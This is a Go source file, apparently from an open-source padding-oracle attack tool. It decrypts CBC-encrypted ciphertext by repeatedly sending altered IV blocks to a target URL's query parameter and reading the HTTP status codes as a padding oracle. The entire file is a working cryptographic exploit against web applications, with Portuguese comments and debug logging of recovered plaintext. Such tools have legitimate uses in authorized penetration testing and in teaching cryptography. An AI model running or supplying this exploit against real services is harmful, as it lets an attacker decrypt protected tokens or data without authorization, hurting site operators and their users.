package oracle

import (
	"bytes"
	"encoding/hex"
	"fmt"
	"net/http"
	"net/url"

	"github.com/arielril/padding-oracle/pkg/types"
	"github.com/projectdiscovery/gologger"
)

type Oracle struct {
	// URL is the url to exploit. ex: https://vuln.com/po?er=
	URL       string
	BlockSize int
}

func New(url string, blockSize int) *Oracle {
	return &Oracle{
		URL:       url,
		BlockSize: blockSize,
	}
}

func (o *Oracle) Exploit(opts *types.Options) {
	cipherBlocks := splitByteBlocks(opts.CipherMessage, opts.BlockSize)

	resultChars := make([]byte, 0)

	for cipherBlockPosition := 0; cipherBlockPosition < len(cipherBlocks)-1; cipherBlockPosition++ {

		// IV block
		iv := cipherBlocks[cipherBlockPosition]
		gologger.Debug().Msgf("initial iv=%v\n", hex.EncodeToString(iv))
		// C block
		cipherBlock := cipherBlocks[cipherBlockPosition+1]

		// caracteres achados
		ca := o.crackBlock(opts, iv, cipherBlock, cipherBlockPosition == len(cipherBlocks)-1-1)

		gologger.Info().Msgf("---------------\ndiscovered chars [hex] = %v\n", hex.EncodeToString(ca))
		gologger.Info().Msgf("discovered chars [str] = %v\n---------------\n", string(ca))
		resultChars = append(resultChars, ca...)
	}

	gologger.Info().Msgf("result string [bytes] = %v\n", hex.EncodeToString(resultChars))
	gologger.Info().Msgf("result string = %v\n", string(resultChars))
}

// crackBlock will return the same "discoveredChars" input with the new values
func (o *Oracle) crackBlock(opts *types.Options, ivBlock, cipherBlock []byte, isLastBlock bool) []byte {
	discoveredChars := make([]byte, opts.BlockSize)

	// do fim pro inicio
	for bytePosition := opts.BlockSize - 1; bytePosition >= 0; bytePosition-- {

		bytePad := opts.BlockSize - bytePosition
		bytePadBlock := append(bytes.Repeat([]byte{0}, bytePosition), bytes.Repeat([]byte{byte(bytePad)}, bytePad)...)
		gologger.Debug().Msgf("byte pad block %v\n", hex.EncodeToString(bytePadBlock))

		ivCopy := append(make([]byte, 0), ivBlock...)

		for caPrime := 0; caPrime <= 0xff; caPrime++ {
			fmt.Println("-")
			gologger.Debug().Msgf("attempting ca'=%v\n", caPrime)

			ivBlock := xorByteSlice(ivCopy, bytePadBlock)
			gologger.Debug().Msgf("iv xor pad = %v\n", hex.EncodeToString(ivBlock))

			ivBlock = xorByteSlice(ivBlock, discoveredChars)
			ivBlock[bytePosition] = ivBlock[bytePosition] ^ byte(caPrime)
			gologger.Debug().Msgf("iv block %v\n", hex.EncodeToString(ivBlock))

			attempt := append(ivBlock, cipherBlock...)
			found := o.getPrevision(hex.EncodeToString(attempt))
			if found {
				if bytePosition == opts.BlockSize-1 && isLastBlock {
					// if is the last byte and is the last block from the cipher text
					// the found character is the padding
					// remove the padding from the discovery of new chars
					bytePosition = opts.BlockSize - 1 - caPrime
				}

				gologger.Info().Msgf("found ca' %v\n", caPrime)

				discoveredChars[bytePosition] = byte(caPrime)
				gologger.Debug().Msgf("ca = %v\n", hex.EncodeToString(discoveredChars))
				break
			}

		}

	}

	return discoveredChars
}

func (o *Oracle) getPrevision(qs string) bool {
	url := fmt.Sprintf("%s%s", o.URL, url.QueryEscape(qs))
	gologger.Debug().Msgf("requesting %s\n", url)

	resp, err := http.Get(url)
	if err != nil {
		gologger.Warning().Msgf("could not request oracle: %s\n", err)
		return false
	}

	if resp.StatusCode == http.StatusNotFound || resp.StatusCode == http.StatusOK {
		// good padding response
		return true
	}

	return false
}
